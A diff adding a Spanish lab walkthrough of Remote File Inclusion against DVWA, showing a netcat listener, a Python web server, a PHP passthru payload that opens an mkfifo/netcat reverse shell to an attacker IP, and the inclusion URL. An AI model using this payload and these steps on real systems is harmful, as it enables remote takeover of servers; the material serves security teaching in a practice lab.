@@ -17,4 +17,43 @@ Con un ataque RFI se puede conseguir:
 
 - Ejecución Remota de Comandos: Aún más peligroso es la capacidad de ejecutar comandos de forma remota en el servidor web a través de un ataque RFI. Esto puede lograrse si el atacante logra incluir un script PHP (o cualquier otro lenguaje de servidor que se esté ejecutando) desde un servidor remoto que el servidor web víctima ejecutará como suyo. Este script puede contener código que ejecute comandos en el servidor, lo que podría permitir al atacante tomar el control total del servidor web, acceder a bases de datos sensibles, modificar archivos del sistema, instalar malware, crear backdoors para acceso futuro, entre otras acciones maliciosas. La ejecución remota de comandos abre la puerta a una amplia gama de actividades perjudiciales que pueden comprometer la seguridad y la funcionalidad del servidor y de los datos alojados en él.
 
-Ejemplo: Pagina 258 de hacking etico de J.L.Berenguel
+
+### En la máquina atacante
+Para obtner la shell reversa, usaremos netcat tanto en el atacante (kali) como en la víctima (ubuntu):
+- En la máquina atacante (Kali), iniciamos Netcat en modo escucha especificando un puerto:
+  ```
+  nc -lnvp 9000
+  ```
+  ![](capturas/remote-file-inclusion.png)
+
+- En el atacante arrancamos un servidor web:
+  ```
+  python3 -m http.server 80
+  ```
+  ![](capturas/remote-file-inclusion-2.png)
+
+- Creamos un documento que contendrá el fichero que deberá ejecutar la máquina víctima para lanzar la shell reversa:
+  ```
+  mkdir /tmp/files
+  cd /tmp/files
+  nano reverse.txt
+  
+  <?php
+        passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 192.168.1.103 9000 > /tmp/f");
+  ?>  
+  ```
+  ![](capturas/remote-file-inclusion-3.png)
+  La función passthru ejecutará el comando que recibe como argumento. Este comando crea un canal de comunicación bidireccional entre la máquina víctima y la atacante, usando un archivo FIFO en /tmp/f. Primero, elimina /tmp/f si existe y luego crea un FIFO con mkfifo. Utiliza cat para leer este FIFO y pasa la salida a sh -i, creando una shell interactiva que redirige tanto la entrada estándar como la salida estándar y el error estándar a través de Netcat hacia la dirección IP 192.168.1.103 en el puerto 9000. Finalmente, la salida de Netcat se redirige de nuevo al FIFO, completando el circuito para la comunicación bidireccional. Los datos circulan a través de la conexión con la máquina atacante en la ip 192.168.1.103 y el puerto 9000, y la máquina vulnerable por medio del fichero FIFO.
+
+
+### En la máquina víctima
+Utilizamos la URL en la que conseguimos hacer LFI:
+```
+/DVWA/vulnerabilities/fi/?page=http://192.168.1.103/reverse.txt
+```
+![](capturas/remote-file-inclusion-4.png)
+
+
+### En la máquina atacante
+Vemos que se ha conseguido finalizar la shell reversa:
+![](capturas/remote-file-inclusion-5.png)
